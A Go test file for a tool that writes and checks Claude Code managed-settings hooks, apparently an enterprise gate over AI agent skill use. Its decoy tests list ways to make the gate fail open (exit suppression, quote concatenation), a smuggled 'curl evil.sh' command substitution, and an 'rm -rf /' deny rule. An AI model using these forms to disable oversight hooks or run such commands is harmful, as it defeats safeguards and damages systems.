package pin

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestManagedSettingsPath(t *testing.T) {
	cases := map[string]string{
		"darwin":  "/Library/Application Support/ClaudeCode/managed-settings.json",
		"linux":   "/etc/claude-code/managed-settings.json",
		"windows": `C:\Program Files\ClaudeCode\managed-settings.json`,
	}
	for goos, want := range cases {
		got, err := ManagedSettingsPath(goos)
		if err != nil {
			t.Fatalf("%s: unexpected error %v", goos, err)
		}
		if got != want {
			t.Errorf("%s: got %q want %q", goos, got, want)
		}
	}
	if _, err := ManagedSettingsPath("plan9"); err == nil {
		t.Error("expected error for unknown GOOS (fail-closed), got nil")
	}
}

func TestGenerate_DefaultIsUnDeletableButNotStrict(t *testing.T) {
	b, err := Generate(GenerateOptions{BinaryPath: "/usr/local/bin/skillctl"})
	if err != nil {
		t.Fatal(err)
	}
	// Round-trips as JSON.
	var raw map[string]any
	if err := json.Unmarshal(b, &raw); err != nil {
		t.Fatalf("generated output is not valid JSON: %v\n%s", err, b)
	}
	if _, ok := raw["allowManagedHooksOnly"]; ok {
		t.Error("default (non-strict) must NOT set allowManagedHooksOnly (it would disable user hooks)")
	}
	s := string(b)
	if !strings.Contains(s, "/usr/local/bin/skillctl verify --all --quarantine") {
		t.Errorf("missing SessionStart sweep command with absolute binary:\n%s", s)
	}
	if !strings.Contains(s, "/usr/local/bin/skillctl verify-hook") {
		t.Errorf("missing PreToolUse verify-hook command:\n%s", s)
	}
	// Verify classifies its own default output as pinned (un-deletable).
	res := Verify(b)
	if res.Level != LevelPinned {
		t.Errorf("default generate should verify as pinned, got %s", res.Level)
	}
	if !res.Pinned() {
		t.Error("default generate should be Pinned()")
	}
}

func TestGenerate_StrictAndHarden(t *testing.T) {
	strict, _ := Generate(GenerateOptions{Strict: true})
	if !strings.Contains(string(strict), `"allowManagedHooksOnly": true`) {
		t.Errorf("strict must set allowManagedHooksOnly:true\n%s", strict)
	}
	if strings.Contains(string(strict), "disableBypassPermissionsMode") {
		t.Error("strict (without harden) must NOT set disableBypassPermissionsMode")
	}
	if Verify(strict).Level != LevelPinnedStrict {
		t.Errorf("strict should verify as pinned-strict, got %s", Verify(strict).Level)
	}

	harden, _ := Generate(GenerateOptions{Harden: true})
	if !strings.Contains(string(harden), `"allowManagedHooksOnly": true`) {
		t.Error("harden implies strict → allowManagedHooksOnly:true")
	}
	if !strings.Contains(string(harden), `"disableBypassPermissionsMode": "disable"`) {
		t.Errorf("harden must set disableBypassPermissionsMode:disable\n%s", harden)
	}
	hs := Verify(harden)
	if !hs.DisableBypass {
		t.Error("Verify should report DisableBypass for hardened settings")
	}
}

func TestGenerate_DefaultBinaryName(t *testing.T) {
	b, _ := Generate(GenerateOptions{})
	if !strings.Contains(string(b), "skillctl verify-hook") {
		t.Errorf("empty BinaryPath should fall back to bare 'skillctl'\n%s", b)
	}
}

func TestGenerate_QuotesBinaryWithSpaces(t *testing.T) {
	b, _ := Generate(GenerateOptions{BinaryPath: "/Applications/My Tools/skillctl"})
	// Decode the JSON and check the actual command value (raw bytes contain
	// JSON-escaped quotes \" — assert on the decoded string, not the wire bytes).
	var got struct {
		Hooks struct {
			PreToolUse []struct {
				Hooks []struct {
					Command string `json:"command"`
				} `json:"hooks"`
			} `json:"PreToolUse"`
		} `json:"hooks"`
	}
	if err := json.Unmarshal(b, &got); err != nil {
		t.Fatalf("not JSON: %v", err)
	}
	cmd := got.Hooks.PreToolUse[0].Hooks[0].Command
	if cmd != `"/Applications/My Tools/skillctl" verify-hook` {
		t.Errorf("binary path with spaces must be shell-quoted; got %q", cmd)
	}
	// And it must still parse back as pinned (the escaped quotes are valid JSON).
	if Verify(b).Level != LevelPinned {
		t.Errorf("quoted-binary output should verify as pinned, got %s", Verify(b).Level)
	}
}

func TestVerify_Tampered(t *testing.T) {
	res := Verify([]byte(`{ this is not json `))
	if res.Level != LevelTampered {
		t.Errorf("malformed JSON must be tampered (fail-closed), got %s", res.Level)
	}
	if res.Pinned() {
		t.Error("tampered must NOT count as pinned")
	}
}

func TestVerify_Partial(t *testing.T) {
	// Only the PreToolUse gate, no SessionStart sweep.
	only := `{"hooks":{"PreToolUse":[{"matcher":"Skill","hooks":[{"type":"command","command":"skillctl verify-hook"}]}]}}`
	res := Verify([]byte(only))
	if res.Level != LevelPartial {
		t.Errorf("one hook present should be partial, got %s", res.Level)
	}
	if !res.HasVerifyHook || res.HasSweepHook {
		t.Errorf("expected verify-hook present, sweep absent; got %+v", res)
	}
	if res.Pinned() {
		t.Error("partial must not be Pinned()")
	}
	if len(res.Findings) == 0 {
		t.Error("partial should report a finding about the missing sweep")
	}
}

func TestVerify_EmptyManagedFileIsPartial(t *testing.T) {
	res := Verify([]byte(`{}`))
	if res.Level != LevelPartial {
		t.Errorf("empty-but-valid managed file → partial (gate not pinned), got %s", res.Level)
	}
}

func TestVerify_MatchesForeignBinaryPath(t *testing.T) {
	// A managed file installed with a different absolute binary path must still
	// classify as pinned (shape match on the canonical subcommands).
	foreign := `{"hooks":{
	  "SessionStart":[{"matcher":"*","hooks":[{"type":"command","command":"/opt/sec/skillctl verify --all --quarantine","timeout":90}]}],
	  "PreToolUse":[{"matcher":"Skill","hooks":[{"type":"command","command":"/opt/sec/skillctl verify-hook","timeout":20}]}]
	}}`
	if Verify([]byte(foreign)).Level != LevelPinned {
		t.Errorf("foreign-path gate should still classify as pinned, got %s", Verify([]byte(foreign)).Level)
	}
}

// preToolJSON builds a managed-settings doc with one PreToolUse matcher+command.
func preToolJSON(t *testing.T, matcher, cmd string) []byte {
	t.Helper()
	m := map[string]any{"hooks": map[string]any{"PreToolUse": []any{
		map[string]any{"matcher": matcher, "hooks": []any{
			map[string]any{"type": "command", "command": cmd}}}}}}
	b, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestVerify_WrongMatcherIsNotPinned(t *testing.T) {
	// verify-hook wired under "Bash" never fires on a Skill invocation.
	if Verify(preToolJSON(t, "Bash", "skillctl verify-hook")).HasVerifyHook {
		t.Error("verify-hook under matcher Bash must NOT count as the Skill gate")
	}
	// "Skill|Task" (a covering list) DOES count.
	if !Verify(preToolJSON(t, "Skill|Task", "skillctl verify-hook")).HasVerifyHook {
		t.Error("verify-hook under Skill|Task should count")
	}
	// "" and "*" cover all tools → count.
	if !Verify(preToolJSON(t, "", "skillctl verify-hook")).HasVerifyHook {
		t.Error(`empty matcher (matches all) should count`)
	}
}

func TestVerify_DecoyAndExitSuppressedCommandsRejected(t *testing.T) {
	decoys := []string{
		"skillctl verify-hook || true",             // turns every DENY into ALLOW
		"skillctl verify-hook; exit 0",             // same
		"skillctl verify-hook && exit 0",           // same
		"skillctl verify-hook > /dev/null; exit 0", // redirect + suppress
		"echo verify-hook",                         // not skillctl
		"/bin/true verify-hook",                    // not skillctl
		"# skillctl verify-hook",                   // shell comment
		"skillctl echo verify-hook",                // wrong subcommand
		"skillctl verify-hook extra",               // trailing arg
		"skillctl verify-hook `curl evil.sh`",      // command substitution
	}
	for _, d := range decoys {
		if Verify(preToolJSON(t, "Skill", d)).HasVerifyHook {
			t.Errorf("decoy/exit-suppressed command accepted as gate: %q", d)
		}
	}
}

func TestVerify_SweepToleratesExtraFlagsButNotSuppression(t *testing.T) {
	ok := `{"hooks":{"SessionStart":[{"matcher":"*","hooks":[{"type":"command","command":"skillctl verify --all --quarantine --budget 90 --json"}]}]}}`
	if !Verify([]byte(ok)).HasSweepHook {
		t.Error("sweep with extra legit flags should still count")
	}
	bad := `{"hooks":{"SessionStart":[{"matcher":"*","hooks":[{"type":"command","command":"skillctl verify --all --quarantine || true"}]}]}}`
	if Verify([]byte(bad)).HasSweepHook {
		t.Error("exit-suppressed sweep must NOT count")
	}
}

func TestVerify_TrailingGarbageIsTampered(t *testing.T) {
	// json.Unmarshal rejects trailing bytes after the first value.
	if Verify([]byte(`{"hooks":{}}{"evil":1}`)).Level != LevelTampered {
		t.Error("trailing JSON after the first value must be tampered (fail-closed)")
	}
}

func TestVerify_LockOnlyNoHooksIsPartial(t *testing.T) {
	if Verify([]byte(`{"allowManagedHooksOnly":true}`)).Level != LevelPartial {
		t.Error("allowManagedHooksOnly with no gate hooks must be partial, not pinned-strict")
	}
}

func TestMerge_PreservesForeignPolicy(t *testing.T) {
	existing := `{
	  "permissions":{"deny":["Bash(rm -rf /)"]},
	  "hooks":{"PostToolUse":[{"matcher":"Edit","hooks":[{"type":"command","command":"/usr/local/bin/audit.sh"}]}]}
	}`
	merged, err := Merge([]byte(existing), GenerateOptions{BinaryPath: "/usr/local/bin/skillctl"})
	if err != nil {
		t.Fatal(err)
	}
	s := string(merged)
	if !strings.Contains(s, "rm -rf /") {
		t.Error("Merge dropped the foreign permissions block")
	}
	if !strings.Contains(s, "/usr/local/bin/audit.sh") {
		t.Error("Merge dropped the foreign PostToolUse hook")
	}
	if Verify(merged).Level != LevelPinned {
		t.Errorf("Merge should yield a pinned file, got %s", Verify(merged).Level)
	}
}

func TestMerge_Idempotent(t *testing.T) {
	once, _ := Merge([]byte(`{}`), GenerateOptions{})
	twice, _ := Merge(once, GenerateOptions{})
	if strings.Count(string(twice), "verify-hook") != strings.Count(string(once), "verify-hook") {
		t.Errorf("Merge duplicated the gate hook on re-run:\n%s", twice)
	}
}

func TestMerge_RefusesInvalidExisting(t *testing.T) {
	if _, err := Merge([]byte("{ not json"), GenerateOptions{}); err == nil {
		t.Error("Merge must refuse invalid existing JSON (not silently overwrite)")
	}
}

func TestMerge_EmptyGeneratesFresh(t *testing.T) {
	b, err := Merge([]byte("   "), GenerateOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if Verify(b).Level != LevelPinned {
		t.Error("Merge of empty input should generate a fresh pinned file")
	}
}

// D1: a quoted binary concatenated to more text with no separating whitespace
// (`"skillctl"verify-hook`) would run as the single word `skillctlverify-hook`
// at the shell → command-not-found → gate fails OPEN. It must NOT verify pinned.
func TestVerify_QuoteConcatNotPinned(t *testing.T) {
	concat := []string{
		`"skillctl"verify-hook`,
		`"skillctl"verify --all --quarantine`,
		`'skillctl'verify-hook`,
	}
	for _, c := range concat {
		if Verify(preToolJSON(t, "Skill", c)).HasVerifyHook {
			t.Errorf("quote-concat command must NOT count as gate: %q", c)
		}
	}
	// The legit quoted-with-space form still counts.
	if !Verify(preToolJSON(t, "Skill", `"/opt/my tools/skillctl" verify-hook`)).HasVerifyHook {
		t.Error("legit quoted binary (space after close-quote) should count")
	}
	if !Verify(preToolJSON(t, "Skill", `'skillctl' verify-hook`)).HasVerifyHook {
		t.Error("legit single-quoted binary should count")
	}
}

// D4: Claude Code matchers are regex — a regex that matches "Skill" covers it.
func TestVerify_RegexMatcherCovers(t *testing.T) {
	for _, m := range []string{".*", "Skill.*", "Sk.*", "Task|Skill"} {
		if !Verify(preToolJSON(t, m, "skillctl verify-hook")).HasVerifyHook {
			t.Errorf("regex matcher %q should cover the Skill tool", m)
		}
	}
	for _, m := range []string{"Bash", "Edit|Write", "Task"} {
		if Verify(preToolJSON(t, m, "skillctl verify-hook")).HasVerifyHook {
			t.Errorf("matcher %q must NOT cover the Skill tool", m)
		}
	}
}

// D2: an existing verify-hook under a NON-covering matcher must not stop Merge
// from adding the covering Skill matcher — else the merged file fails Verify.
func TestMerge_AddsCoveringMatcherDespiteNonCoveringDecoy(t *testing.T) {
	existing := `{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"skillctl verify-hook"}]}]}}`
	merged, err := Merge([]byte(existing), GenerateOptions{BinaryPath: "skillctl"})
	if err != nil {
		t.Fatal(err)
	}
	if !Verify(merged).HasVerifyHook {
		t.Errorf("Merge must add a Skill-covering gate even when a Bash-bound one exists:\n%s", merged)
	}
	// The Bash entry is preserved (not clobbered).
	if !strings.Contains(string(merged), `"Bash"`) {
		t.Error("Merge dropped the pre-existing Bash matcher")
	}
}

// TestEnterpriseFromBytes locks the SPEC-0317 R-7.2 managed enterprise reader:
// only a cleanly-parsed skillctlEnterprise:true engages it; missing/false/
// malformed all yield false (never-brick — locking on a corrupt file would brick).
func TestEnterpriseFromBytes(t *testing.T) {
	if !EnterpriseFromBytes([]byte(`{"skillctlEnterprise":true}`)) {
		t.Error("skillctlEnterprise:true must read as enterprise")
	}
	for _, neg := range []string{
		`{"skillctlEnterprise":false}`,
		`{}`,
		`{"other":1}`,
		`{ not json`,
		``,
	} {
		if EnterpriseFromBytes([]byte(neg)) {
			t.Errorf("must be non-enterprise (never-brick): %q", neg)
		}
	}
	if EnterpriseFromBytes(nil) {
		t.Error("nil must be non-enterprise")
	}
	// The flag coexists with the gate hooks + strict lock and does not disturb the
	// pinning classification.
	b, err := Generate(GenerateOptions{Enterprise: true, Strict: true})
	if err != nil {
		t.Fatal(err)
	}
	if !EnterpriseFromBytes(b) {
		t.Error("Generate(Enterprise) must round-trip through EnterpriseFromBytes")
	}
	if Verify(b).Level != LevelPinnedStrict {
		t.Errorf("enterprise flag must not change the pinning level, got %s", Verify(b).Level)
	}
}

func TestGenerate_EnterpriseKey(t *testing.T) {
	on, _ := Generate(GenerateOptions{Enterprise: true})
	if !strings.Contains(string(on), `"skillctlEnterprise": true`) {
		t.Errorf("--enterprise must emit the key:\n%s", on)
	}
	off, _ := Generate(GenerateOptions{})
	if strings.Contains(string(off), "skillctlEnterprise") {
		t.Errorf("default must NOT emit the enterprise key:\n%s", off)
	}
}

// TestRequireLocalAuditFromBytes locks the R-8.2 reader: enterprise-GATED (both
// flags), missing/malformed → false.
func TestRequireLocalAuditFromBytes(t *testing.T) {
	if !RequireLocalAuditFromBytes([]byte(`{"skillctlEnterprise":true,"skillctlRequireLocalAudit":true}`)) {
		t.Error("both flags → require_local_audit on")
	}
	for _, neg := range []string{
		`{"skillctlRequireLocalAudit":true}`, // enterprise missing → gated off
		`{"skillctlEnterprise":true,"skillctlRequireLocalAudit":false}`,
		`{"skillctlEnterprise":true}`,
		`{}`,
		`{ not json`,
	} {
		if RequireLocalAuditFromBytes([]byte(neg)) {
			t.Errorf("must be off (enterprise-gated / conservative): %q", neg)
		}
	}
	// round-trip via Generate: --require-local-audit implies enterprise.
	b, _ := Generate(GenerateOptions{RequireLocalAudit: true})
	if !RequireLocalAuditFromBytes(b) {
		t.Error("Generate(RequireLocalAudit) must round-trip")
	}
	if !EnterpriseFromBytes(b) {
		t.Error("--require-local-audit must also emit enterprise (enterprise-only)")
	}
}

// TestStateGateFallbackFromBytes locks the R-1.4 P2 reader: enterprise-GATED (both
// flags), missing/malformed → false (never-brick).
func TestStateGateFallbackFromBytes(t *testing.T) {
	if !StateGateFallbackFromBytes([]byte(`{"skillctlEnterprise":true,"skillctlStateGateFallback":true}`)) {
		t.Error("both flags → state_gate_fallback on")
	}
	for _, neg := range []string{
		`{"skillctlStateGateFallback":true}`, // enterprise missing → gated off
		`{"skillctlEnterprise":true,"skillctlStateGateFallback":false}`,
		`{"skillctlEnterprise":true}`,
		`{}`,
		`{ not json`,
		``,
	} {
		if StateGateFallbackFromBytes([]byte(neg)) {
			t.Errorf("must be off (enterprise-gated / conservative): %q", neg)
		}
	}
	// round-trip via Generate: --state-gate-fallback implies enterprise.
	b, _ := Generate(GenerateOptions{StateGateFallback: true})
	if !StateGateFallbackFromBytes(b) {
		t.Error("Generate(StateGateFallback) must round-trip")
	}
	if !EnterpriseFromBytes(b) {
		t.Error("--state-gate-fallback must also emit enterprise (enterprise-only)")
	}
	if strings.Contains(string(b), "RequireLocalAudit") || strings.Contains(string(b), "skillctlRequireLocalAudit") {
		t.Error("state-gate-fallback must NOT imply require_local_audit (independent knobs)")
	}
	// The knobs are independent: require_local_audit alone must not emit state-gate.
	rla, _ := Generate(GenerateOptions{RequireLocalAudit: true})
	if StateGateFallbackFromBytes(rla) {
		t.Error("require_local_audit alone must NOT enable state_gate_fallback")
	}
}
